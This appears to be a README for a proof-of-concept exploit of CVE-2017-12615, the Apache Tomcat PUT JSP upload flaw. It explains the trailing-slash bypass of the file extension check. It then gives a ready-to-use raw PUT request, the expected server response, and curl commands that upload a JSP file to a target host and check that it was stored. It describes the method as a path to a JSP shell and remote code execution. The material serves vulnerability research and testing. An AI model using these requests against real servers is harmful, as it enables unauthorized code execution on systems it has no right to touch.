### _In memory of Chia Junyuan (https://packetstormsecurity.com/files/author/11924/)_

# POC CVE-2017-12615
POC Exploit for Apache Tomcat 7.0.0 to 7.0.79 running on Windows; CVE-2017-12615 PUT JSP vulnerability.

## Description:
By design, you are not allowed to upload JSP files via the PUT method on the Apache Tomcat servers.
This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server.
However, due to the insufficient checks, an attacker could gain remote code execution on 7.0.{0 to 79} Tomcat servers that has enabled PUT by requesting PUT method on the Tomcat server using a specially crafted HTTP request. But seriously, special? Please.

## Exploit method:
By appending a '/' character behind the filename's extension, one can bypass the file extension check. That's it. So, not that special actually.

### Exploit in a Request Method:
#### Request
```http
PUT /myfile.jsp/
Host: domain-name:port
Connection: close
Content-Length: 85

<% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>
```
#### Expected response if successful
```http
HTTP/1.1 201 Created
Server: Apache-Coyote/1.1
Content-Length: 0
Date: Sat, 23 Sep 2017 06:36:36 GMT
Connection: close
```

### Exploit using 'curl':
1. Create a .jsp file (e.g. test.jsp):
```jsp
<% out.write("<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write  executed.</h3></body></html>"); %>
```
2. Perform the curl command on target server:
```sh
curl -X PUT http://target-host-or-ip-address:port/test.jsp/ -d @- < test.jsp
```
3. Check if your file is uploaded by browsing to the target address or:
```sh
curl http://target-host-or-ip-address:port/test.jsp
```
